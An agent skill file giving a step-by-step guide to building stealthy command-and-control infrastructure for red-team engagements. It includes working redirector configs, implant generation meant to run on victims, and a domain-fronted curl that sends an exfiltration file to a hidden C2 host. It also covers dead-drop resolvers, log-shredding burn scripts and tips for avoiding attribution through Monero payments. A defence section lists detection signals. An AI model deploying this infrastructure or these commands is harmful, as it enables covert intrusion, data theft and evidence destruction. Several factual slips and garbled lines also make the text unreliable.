---
name: red-team-infrastructure
description: Building, deploying, and operating stealthy C2 infrastructure for red team engagements. Covers Mythic, Havoc, Sliver, Covenant, PoshC2, Brute Ratel, and Cobalt Strike; redirector chains (Nginx mTLS, Cloudflare workers, CDN domain fronting); dead-drop resolvers; infrastructure OPSEC (compartmentalized servers, auto-rotated certs, decoupled domains); AMIS/GoDaddy API for automated rotation. Use when deploying dedicated adversary emulation infrastructure, planning redirector chains, or testing OPSEC resilience of red team operators.
origin: kali-claw
version: "0.2.0.2"
compatibility:
  - kali-linux-2025-2-arm64
  - python-3.11+
  - docker-26+
  - mythic-3.3+
  - sliver-1.5+
  - havoc-0.7+
  - nginx-1.24+
  - cloudflared-2024+
allowed-tools:
  - mythic
  - havoc
  - sliver
  - covenant
  - poshc2
  - brute-ratel
  - cobalt-strike
  - chisel
  - gost
  - nginx
  - socat
  - cloudflared
  - frps
  - wireguard
  - ansible
  - terraform
  - certbot
  - dnscat2
  - iodine
  - merlin
metadata:
  domain: red-team-infrastructure
  tool_count: 20
  guide_count: 2
  mitre: "TA0011-Command and Control, T1001, T1008, T1090, T1104, T1132, T1568, T1571, T1572, T1573"
  last_reviewed: "2026-07-26"
---

# Red Team Infrastructure

## Summary

Red team infrastructure is the offensive platform on which adversary emulation runs: C2 frameworks, redirectors, domains, certificates, listeners, listeners, listeners — every component that lets operators control implants while evading defenders. This domain covers modern C2 platform selection (Mythic modular, Havoc C++, Sliver Go, Covenant .NET, PoshC2 PowerShell, Brute Ratel, Cobalt Strike), redirector architecture (Nginx mTLS reverse proxy, Cloudflare Workers, CDN domain fronting, AzDoors), dead-drop resolvers (GitHub gist, Telegram channels, Reddit posts), and infrastructure OPSEC (compartmentalization, decoupled domain tiers, rotating certificates, burnable infrastructure).

## Key Terms

- **C2 framework** — Software that manages implants (beacons), listeners, and operator console
- **Implant / beacon** — Agent running on victim that checks in to C2
- **Listener** — Server-side endpoint that accepts implant check-ins
- **Redirector** — Network appliance that forwards C2 traffic (hides true C2 origin)
- **Malleable C2** — Customizable beacon profile (HTTP method, headers, jitter)
- **Domain fronting** — Use of legitimate CDN SNI to hide attacker origin
- **Dead-drop resolver** — Public service (GitHub, Reddit) used as IP distribution point
- **Burnable infrastructure** — Resources that can be discarded if detected
- **OPSEC** — Operations Security (compartmentalization, attribution avoidance)
- **C2 profile** — Listener + implant + redirector configuration bundle
- **Staging server** — Hosts payload before delivery to victim
- **Tier-1 / Tier-2 / Tier-3** — Domain trust tiers (1 = throwaway, 3 = long-lived)

## Scope

This skill covers **red team infrastructure deployment and operations**:
- C2 framework selection and deployment (Mythic, Sliver, Havoc, etc.)
- Redirector architecture (Nginx mTLS, Cloudflare, CDN fronting)
- Domain portfolio management (registration, categorization, rotation)
- Certificate automation (Let's Encrypt, ACME, certbot)
- Dead-drop resolver design
- OPSEC compartmentalization (separate teams / accounts / hosting)
- Engagement infrastructure lifecycle (build → operate → burn → rebuild)

**Out of scope**: payload generation (see `payload-generation` skill), AV/EDR evasion (see `av-edr-evasion` skill), malware development (see `malware-analysis-advanced`).

## Use Cases

- **C2 deployment for adversary emulation**: Stand up Sliver / Mythic / Havoc to mimic APT29 / FIN6 / Vice Society
- **Redirector chain OPSEC test**: Validate that redirector hides true C2 from network defenders
- **Domain fronting verification**: Confirm SNI ≠ Host header works against target SWG
- **Dead-drop resolver lab**: Set up GitHub gist polling for victim-IP distribution
- **Infrastructure compartmentalization**: Design deployment that survives detection
- **Auto-rotation**: Use Ansible / Terraform to deploy + teardown C2 in <1 hour
- **OPSEC training**: Teach red team operators how to avoid attribution
- **CS infrastructure audit**: Test if SOC can detect legitimate-looking C2 traffic
- **Engagement pivot**: Quickly shift infrastructure if blue team detects campaign
- **Domain portfolio hygiene**: Manage tier-1/2/3 domains for long-lived engagements

## Core Tools

| Tool | Purpose |
|------|---------|
| `Mythic` | Modular C2 framework (Docker-based, agent-agnostic) |
| `Sliver` | Go-based HTTPS/DNS C2 (modern, free) |
| `Havoc` | C++ implant + Python C2 (stealthy) |
| `Covenant` | .NET C2 (Windows focus) |
| `PoshC2` | PowerShell C2 (Windows agents) |
| `Brute Ratel` | Commercial adversary simulation (LOL-bin focused) |
| `Cobalt Strike` | Commercial C2 (industry standard) |
| `chisel` | HTTP/WebSocket tunnel (mTLS) |
| `gost` | Multi-proto tunnel (SOCKS/HTTP/TLS) |
| `nginx` | Reverse proxy (mTLS redirector) |
| `socat` | Universal socket relay |
| `cloudflared` | Cloudflare tunnel (free redirector) |
| `frps` | Fast reverse proxy server |
| `wireguard` | Modern VPN for infrastructure links |
| `ansible` | Configuration management for C2 fleet |
| `terraform` | Infrastructure as code (multi-cloud) |
| `certbot` | Let's Encrypt ACME client |
| `dnscat2` | DNS tunnel C2 (low-persistence fallback) |
| `iodine` | IP-over-DNS (DNS-only environments) |
| `merlin` | HTTP/2 C2 (Go) |

## Methodology

### Phase 1 — Engagement scoping

Match infrastructure complexity to target + objectives:

| Engagement type | Infrastructure | Domains | Hosting |
|-----------------|----------------|---------|---------|
| Single host test | 1 Sliver C2 + 1 redirector | 1 | 1 VPS |
| Adversary emulation (1 day) | Mythic + 2 redirectors | 2 | 2 VPS |
| Long-term red team (months) | Sliver + Mythic + 4 redirectors | 4+ | 4 VPS + cloud |
| APT emulation (state actor) | Full compartmentalized stack | 8+ | 8+ VPS |

### Phase 2 — Domain portfolio

Build tiered domain portfolio:

```bash
# Tier-1: throwaway (cheap .xyz, .top — burned if detected)
# Tier-2: business-look (1-2 year old .com, $20+)
# Tier-3: long-lived (5+ year .com, $50+, with privacy)

# Domain categorization
for domain in $(cat domains.txt); do
  age=$(whois $domain | grep -i "creation" | awk '{print $NF}')
  cat=$(curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=$domain&apikey=$VT_API" | jq -r .categories[0])
  echo "$domain | age=$age | category=$cat"
done

# Privacy registration (Namecheap, Njalla)
# Pay via crypto (Monero preferred for non-attribution)
```

### Phase 3 — Hosting compartmentalization

```bash
# NEVER co-locate C2 + redirector
# NEVER co-locate teams (use different VPS accounts / payment methods)

# Infra plan:
# Team A (C2 team): C2 server, staging server, cert management
# Team B (Redirector team): Nginx reverse proxies, Cloudflare workers
# Team C (Domain team): registrar, DNS management, certs
# Team D (Operator team): operator consoles, VPN entry

# Hosting providers (mix for OPSEC):
# - DigitalOcean (cheap, fast)
# - Vultr (anonymity-friendly)
# - Hetzner (EU, less US visibility)
# - AWS / GCP / Azure (legitimate-looking)
# - Njalla (privacy-respecting)
```

### Phase 4 — C2 framework selection

| Framework | Strength | Weakness | When to use |
|-----------|----------|----------|-------------|
| Mythic | Modular, Docker, modern | Heavy to deploy | Multi-agent engagements |
| Sliver | Go, free, modern | Smaller ecosystem | Default choice |
| Havoc | C++ implant (stealthy) | Newer, less docs | High-stealth engagements |
| Covenant | .NET agent (Windows) | .NET focus | Windows-only targets |
| PoshC2 | PowerShell (Windows) | PS-disabled targets | Legacy Windows estates |
| Brute Ratel | LOLBin (sig-evade) | Commercial ($2500+) | Enterprise EDR evasion |
| Cobalt Strike | Industry standard | $$$, beacon detect | Maturity /w support needs |

### Phase 5 — Redirector chain design

```bash
# 3-tier redirector chain (most OPSEC):
# Implant → CDN front → Cloudflare worker → Nginx mTLS → C2

# Cloudflare worker (Tier-1 redirector)
cat > worker.js << 'EOF'
export default {
  async fetch(request) {
    const url = new URL(request.url);
    url.hostname = 'nginx-redirector.example.com';
    return fetch(url.toString(), request);
  }
}
EOF

# Nginx mTLS (Tier-2 redirector)
cat > /etc/nginx/conf.d/c2.conf << 'EOF'
server {
    listen 443 ssl http2;
    server_name nginx-redirector.example.com;

    ssl_certificate /etc/letsencrypt/live/redirector/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/redirector/privkey.pem;

    ssl_client_certificate /etc/nginx/mtls/ca.crt;
    ssl_verify_client on;

    location /api/ {
        proxy_pass https://c2-backend.example.com:8443;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
EOF

# Implant talks to CDN front with cert pinning
# Only mTLS-authenticated implants reach C2
```

### Phase 6 — Domain fronting

```bash
# Domain fronting via Cloudflare (still works in 2024)
# Front: legitimate Cloudflare customer domain
# Back: hidden attacker origin

curl -H "Host: hidden-c2.example.com" \
     https://legitimate-cdn-customer.example.com/ \
     --data-binary @exfil.enc

# Cloudflare Workers (free, harder to detect)
wrangler publish worker.js --name c2-front

# AWS CloudFront (legacy fronting - removed 2018)
# Azure Front Door (limited support)
# Fastly (still works for some customers)
```

### Phase 7 — Dead-drop resolvers

```bash
# GitHub gist (free, IP-pinned, looks legitimate)
curl -X POST -H "Authorization: token $GH_PAT" \
  https://api.github.com/gists \
  -d '{"description":"config","files":{"config.txt":{"content":"203.0.113.10"}}}'

# Implant polls gist
C2_IP=$(curl -s https://gist.githubusercontent.com/$USER/$GIST_ID/raw/config.txt)

# Telegram channel
curl -s "https://api.telegram.org/bot$TOKEN/getUpdates?chat_id=$CHAT" | jq -r '.result[-1].message.text'

# Reddit / Pastebin / Pastie (alternatives)
```

### Phase 8 — Certificate automation

```bash
# Let's Encrypt (free, 90-day certs)
sudo certbot certonly --nginx -d c2.example.com --non-interactive --agree-tos -m admin@redirector.com

# Wildcard via DNS-01 (preferred for redirectors)
sudo certbot certonly --dns-cloudflare --dns-cloudflare-credentials ~/.cloudflare.ini -d '*.redirector.example.com'

# Auto-rotate (certbot systemd timer)
sudo systemctl enable --now certbot.timer

# Implant cert pinning (pin SHA-256 of leaf cert)
# Rollover new cert with old → implant uses new → revoke old
```

### Phase 9 — OPSEC compartmentalization

```bash
# 1. Separate hosting accounts per team
# 2. Separate payment methods per hosting account
# 3. Separate DNS providers per domain tier
# 4. Separate cert issuers per redirector
# 5. Separate mTLS CAs per implant fleet
# 6. Separate SSH keys per operator

# Burn plan:
# - Implant detected → burn that fleet's C2 + redirector
# - Redirector detected → swap IP + cert
# - Domain detected → repurpose + re-categorize
# - Account detected → rebuild from scratch

# Infrastructure-as-code (Terraform)
cat > main.tf << 'EOF'
resource "digitalocean_droplet" "c2" {
  name   = "web-${count.index}"
  region = "nyc3"
  size   = "s-1vcpu-1gb"
  image  = "ubuntu-22-04-x64"
  count  = 3
  ssh_keys = [data.digitalocean_ssh_key.default.id]
}
EOF
```

### Phase 10 — Teardown + burn

```bash
# Burn infrastructure if detected
terraform destroy -auto-approve

# Wipe C2 server logs
sudo shred -uvz /var/log/mythic/*.log
sudo rm -rf /opt/c2/*

# Revoke certs
sudo certbot revoke --cert-path /etc/letsencrypt/live/redirector/cert.pem

# Close domains (DNS delegation)
# Migrate to new infrastructure

# Document burned assets (avoid re-use for 6+ months)
```

## Practical Steps

### Step 1 — Build Sliver C2 stack

```bash
# C2 server
curl https://sliver.sh/install | sudo bash
sliver

# Generate implant (HTTPS)
sliver > generate --http https://c2.example.com --os linux --arch amd64

# Listener
sliver > http --domain c2.example.com --tls-cert fake.crt

# Implant (run on victim)
./implant.elf

# Multi-protocol fallback
sliver > generate --http https://c2.example.com --dns dns.example.com --mtls mtls.example.com
```

### Step 2 — Build Mythic C2 stack

```bash
# Clone + start
git clone https://github.com/its-a-feature/Mythic
cd Mythic
sudo ./install_docker_ubuntu.sh
sudo nano .env  # set SERVER_IP, etc.

# Start Mythic
sudo ./mythic-cli start

# Build Apollo agent (.NET)
sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo

# Build HTTP profile
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http

# Create payload via web UI
```

### Step 3 — Build Havoc C2 stack

```bash
git clone https://github.com/HavocFramework/Havoc
cd Havoc/teamserver
go build -o Havoc teamserver.go

# Start teamserver
./Havoc -t Alpha --debug

# Connect via client
./Havoc client/

# Generate implant via client
```

### Step 4 — Set up Nginx mTLS redirector

```bash
sudo apt install nginx

# Generate CA + client cert
openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 3650 -key ca.key -out ca.crt -subj "/CN=RedTeam CA"
openssl genrsa -out client.key 2048
openssl req -new -key client.key -out client.csr -subj "/CN=implant"
openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out client.crt -days 365

# Nginx config
cat > /etc/nginx/conf.d/c2.conf << 'EOF'
server {
    listen 443 ssl http2;
    server_name redirector.example.com;

    ssl_certificate /etc/letsencrypt/live/redirector/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/redirector/privkey.pem;

    ssl_client_certificate /etc/nginx/mtls/ca.crt;
    ssl_verify_client on;

    location /api/ {
        proxy_pass https://c2-backend.example.com:8443;
    }

    location / {
        return 404;
    }
}
EOF

sudo nginx -t && sudo systemctl reload nginx
```

### Step 5 — Set up Cloudflare worker redirector

```bash
# Install wrangler
npm install -g wrangler

# Login (use separate account)
wrangler login

# Create worker
mkdir c2-worker && cd c2-worker
wrangler init

# Edit worker.js
cat > src/index.js << 'EOF'
export default {
  async fetch(request, env) {
    const url = new URL(request.url);

    // Steganography: only POST with X-Custom header passes through
    if (request.method !== 'POST' || !request.headers.get('X-Implant-Auth')) {
      return new Response('Not Found', { status: 404 });
    }

    url.hostname = 'c2-backend.example.com';
    url.port = '8443';
    return fetch(url.toString(), request);
  }
}
EOF

# Deploy
wrangler deploy
```

### Step 6 — Dead-drop resolver via GitHub gist

```bash
# Set up gist with C2 IP
echo "203.0.113.10" | gist -f config.txt -d "config"

# Implant reads gist
C2_IP=$(curl -s https://gist.githubusercontent.com/$GIST_USER/$GIST_ID/raw/config.txt | tr -d '[:space:]')

# Update gist when infrastructure rotates
curl -X PATCH -H "Authorization: token $GH_PAT" \
  https://api.github.com/gists/$GIST_ID \
  -d '{"files":{"config.txt":{"content":"'"$NEW_IP"'"}}}'
```

### Step 7 — Auto-rotate infrastructure

```bash
# Ansible playbook
cat > rotate.yml << 'EOF'
- hosts: c2_fleet
  tasks:
    - name: Stop C2 services
      systemd:
        name: "{{ item }}"
        state: stopped
      loop: [mythic, sliver, havoc]

    - name: Rotate certs
      command: certbot renew

    - name: Start C2 services
      systemd:
        name: "{{ item }}"
        state: started
      loop: [mythic, sliver, havoc]

    - name: Wipe logs
      file:
        path: "{{ item }}"
        state: absent
      loop:
        - /var/log/nginx/access.log
        - /var/log/mythic/
EOF

ansible-playbook -i hosts rotate.yml
```

### Step 8 — Domain fronting test

```bash
# Confirm fronting works (Cloudflare customer)
curl -v -H "Host: hidden-c2.example.com" \
     https://legitimate-customer.com/ 2>&1 | grep -E "HTTP|Host"

# Capture SNI vs Host
tcpdump -i any -A -s 0 'tcp port 443' | grep -iE "host:|sni"

# Set up implant profile to use front
# Implant → Cloudflare front → backend C2
```

### Step 9 — Burn + rebuild plan

```bash
# Teardown script (Terraform)
cat > burn.sh << 'EOF'
#!/bin/bash
# 1. Stop services
ssh c2-team "systemctl stop mythic sliver havoc"
# 2. Revoke certs
ssh cert-team "certbot revoke --cert-path redirector.crt"
# 3. Wipe logs
ssh c2-team "shred -uvz /var/log/*"
# 4. Destroy droplets
cd /infra/terraform && terraform destroy -auto-approve
# 5. Migrate domains
python3 migrate_domains.py --new-provider njalla
# 6. Update dead-drop resolver
curl -X PATCH -H "Authorization: token $GH_PAT" \
  https://api.github.com/gists/$GIST_ID \
  -d '{"files":{"config.txt":{"content":"'"$NEW_IP"'"}}}'
EOF

chmod +x burn.sh
```

### Step 10 — Operator OPSEC training

Document operator rules:
1. Never reuse operator accounts across teams
2. Never log into infrastructure from corporate VPN
3. Never discuss infrastructure in customer Slack
4. Never reuse SSH keys across engagements
5. Always use 2FA + hardware token for hosting accounts
6. Always use privacy-respecting registrars
7. Always pay via Monero / privacy-respecting crypto
8. Always check VT / Cisco Umbrella categorization before deploying

## Defense Perspective

Defenders must assume:

1. **C2 lives on legitimate-looking domains** — categorization is the only reliable signal
2. **CDN-fronted traffic is opaque to SWG** — only cert pinning detection helps
3. **mTLS redirectors filter implant traffic** — defenders see traffic to redirector but not payloads
4. **Dead-drop resolvers look like dev workflow** — GitHub gist polling is normal
5. **C2 frameworks leave signatures** — Cobalt Strike beacon, Mythic Apollo, Havoc Demon
6. **Domain age is a strong signal** — <30-day domains = high risk
7. **Cert issuers can leak attribution** — Let's Encrypt on suspicious infra is suspicious
8. **Burnable infrastructure means detection is reversible** — but expensive

Key defensive controls:

- Domain categorization feed (Cisco Umbrella, Bluecoat WebPulse)
- TLS JA3/JA4 fingerprinting (C2 clients have unique fingerprints)
- HTTP/2 fingerprinting (Akamai H2 fingerprint)
- Beacon cadence anomaly (random jitter detection)
- CDN egress to non-CDN origins (Cloudflare → non-CDN backend)
- mTLS handshake anomaly (cert chain inspection)
- GitHub gist polling from server fleet (developer host vs server)
- Behavioral baseline for outbound HTTPS volume
- Threat-intel feed correlation for C2 IP / domain reputation

## C2 Framework Comparison

| Feature | Mythic | Sliver | Havoc | Covenant | PoshC2 | Brute Ratel | Cobalt Strike |
|---------|--------|--------|-------|----------|--------|-------------|---------------|
| Language | Python/Go | Go | C++/Python | C#/.NET | PowerShell | C++ | Java |
| License | Open | Open | Open | Open | Open | Commercial ($2500+) | Commercial ($3000+/user) |
| Platforms | Multi | Multi | Win/Mac/Linux | Windows | Windows | Windows | Windows |
| Implant lang | Modular | Go | C++ | C# | PS | C++ | Java |
| HTTP/S | Yes | Yes | Yes | Yes | Yes | Yes | Yes |
| DNS | Yes (via profiles) | Yes | No | No | No | No | Yes |
| mTLS | Yes | Yes | No | No | No | Yes | Yes |
| SMB pipe | Yes | Yes | Yes | Yes | No | Yes | Yes |
| TCP pivot | Yes | Yes | Yes | Yes | No | Yes | Yes |
| WebSocket | Yes | Yes | Yes | No | No | No | No |
| Implant customize | High | Medium | High | Medium | Low | High | High (malleable) |
| Operator UI | Web | CLI | GUI | Web | CLI | GUI | GUI |

## Redirector Tier Architecture

| Tier | Component | Purpose |
|------|-----------|---------|
| Tier-0 | Implant (victim) | Initiates connection |
| Tier-1 | CDN front (Cloudflare / Fastly) | Hides attacker infra behind CDN SNI |
| Tier-2 | Cloudflare worker | Filters traffic (mTLS / stego / header) |
| Tier-3 | Nginx mTLS redirector | Authenticates implant cert |
| Tier-4 | Cloud VPN (WireGuard) | Encrypted hop |
| Tier-5 | C2 backend | Sliver / Mythic / Havoc |

## Domain Categorization Targets

| Category | Source | Difficulty |
|----------|--------|-----------|
| Health | Alexa Health list | Medium |
| News | Major news sites | Hard |
| Shopping | Amazon look-alike | Medium |
| Education | University look-alike | Hard |
| Government | .gov look-alike | Hard (verification) |
| Tech | Cloud / SaaS look-alike | Easy (uncategorized) |
| Tracking | Analytics look-alike | Easy |

## Threat Actor Infrastructure Profiles

| Actor | Domains | Hosting | Payment |
|-------|---------|---------|---------|
| APT29 / NOBELIUM | High-rep lookalikes | Compromised + cloud | Stolen credit cards |
| APT41 | Compromised legitimate | China-located | Mix |
| FIN6 / FIN7 | Compromised WordPress | US-located | Crypto |
| Vice Society | Throwaway | Mix | Crypto |
| LockBit / Conti | Bulk registered | Bulletproof hosting | Crypto |
| BlackCat | Privacy-respecting | EU + bulletproof | Monero |

## Compliance Context

- **CFAA** — Computer Fraud and Abuse Act (US federal computer crime)
- **Computer Misuse Act 1990** (UK equivalent)
- **GDPR Article 5** — engagement must respect data minimization
- **PCI DSS 12.10** — engagement scope must not affect PCI data
- **HIPAA Security Rule** — covered entity must approve egress testing
- **SOC 2 CC7.3** — security event detection (engagement must trigger)
- **ISO 27001 A.12.6** — technical vulnerability management
- **State laws** (CCPA, NYDFS 500) — breach disclosure trigger

## Engagement Workflow

1. **Scope** — confirm C2 platform, redirector count, domain tier
2. **Procure** — domains, hosting, certs (separate teams)
3. **Build** — Terraform + Ansible deploy C2 + redirectors
4. **Test** — verify implant beacon through redirector chain
5. **Engage** — operate against target with compartmentalized OPSEC
6. **Monitor** — VT, Cisco Umbrella, signature detection monitoring
7. **Burn** — when detected, tear down + rebuild
8. **Report** — infrastructure timeline, detections, gaps

## Lab Setup

```bash
# Multi-VPS lab (local)
multipass launch --name c2 --cpus 2 --mem 2G --disk 20G
multipass launch --name redirector1 --cpus 1 --mem 1G --disk 10G
multipass launch --name redirector2 --cpus 1 --mem 1G --disk 10G

# Sliver on c2 VM
multipass exec c2 -- bash -c "curl https://sliver.sh/install | sudo bash"

# Nginx on redirectors
multipass exec redirector1 -- bash -c "sudo apt install -y nginx"

# WireGuard VPN between c2 and redirectors
multipass exec c2 -- bash -c "sudo apt install -y wireguard"
```

## Quality Checklist

- [ ] C2 framework selected + deployed
- [ ] Redirector chain (≥3 tiers) deployed
- [ ] Domain portfolio tiered (1/2/3)
- [ ] Cert automation (certbot ACME)
- [ ] Dead-drop resolver operational
- [ ] OPSEC compartmentalization (separate accounts / payment / SSH)
- [ ] Burn plan documented + tested
- [ ] Implant tested through full chain
- [ ] Detection monitoring (VT, Umbrella) in place
- [ ] Final report includes infra timeline + gaps

## Detection Methods

### C2 Infrastructure Detection
- **Domain age**: Newly registered domains (<30 days) contacted by internal endpoints.
- **TLS fingerprinting**: JA3/JA4 hash matches known C2 (Cobalt Strike default profile).
- **Beacon patterns**: Periodic connections with jitter; statistical analysis (RITA).
- **Malleable C2 profiles**: Covert Strike malleable C2 patterns detectable via heuristic.

### SIEM Detection Rules
- **Splunk SPL**: `index=proxy | stats count by url | where count > 100 | sort -count`
- **RITA (Real Intelligence Threat Analytics)**: Statistical beacon detection.
- **Threat intel platforms**: Recorded Future, Mandiant for known C2 infrastructure.

## Defense Evasion Techniques

### Domain Reputation Stealth
- **Aged domains**: Buy aged domains (>1 year old); higher reputation.
- **CDN fronting**: Use CloudFront, Azure CDN; appears as legitimate CDN traffic.
- **Valid TLS certificates**: Let's Encrypt for C2 domain; no cert warnings.
- **Category 4 / "benign" domains**: Use domains categorized as news/blogs; less suspicious.

### Malleable C2 Stealth
- **Legitimate-looking profile**: Mimic real web traffic (jQuery, Google Analytics).
- **Jitter parameter**: Randomize sleep interval to evade statistical detection.
- **Long-haul beaconing**: 24h interval for high-value targets; harder to correlate.
- **Custom profiles**: Avoid default Cobalt Strike profile (well-signatured).

### Redirector Chains
- **Tier-1 redirectors**: Use cheap VPS as redirector; main C2 behind.
- **Cloud function redirectors**: AWS Lambda / Cloudflare Workers; legitimate-looking.
- **Domain rotation**: Rotate redirector domains regularly; burn rate detection.
- **HTTPS termination at redirector**: TLS terminated at redirector; main C2 sees only HTTP.

## References

- MITRE ATT&CK Command and Control — https://attack.mitre.org/tactics/TA0011/
- Mythic documentation — https://docs.mythic-c2.net/
- Sliver documentation — https://sliver.sh/docs/
- Havoc documentation — https://havocframework.com/docs/
- "Red Team Infrastructure" (Rasta Mouse, 2023)
- "Defending Against Command-and-Control" (SpecterOps, 2022)
- "C2 Infrastructure 101" (TrustedSec, 2023)
- "Compartmentalizing Infrastructure" (Red Siege, 2023)
- "Domain Fronting" (CSIS 2017)
- "Cloudflare Workers for C2" (0xPat, 2022)
- Mandiant APT29 / NOBELIUM reports (2021–2024)
- CrowdStrike 2024 Global Threat Report
- "Red Team Field Manual" (RTFM)
- "Operator Handbook" (Hausknecht, 2023)
- "Detection Engineering" (Kyle Riley, 2023)
- SpecterOps "Tradecraft" series
- BlackHat USA 2023 — "Modern C2 Infrastructure"
- "Cobalt Strike OPSEC" (Rasta Mouse, 2022)
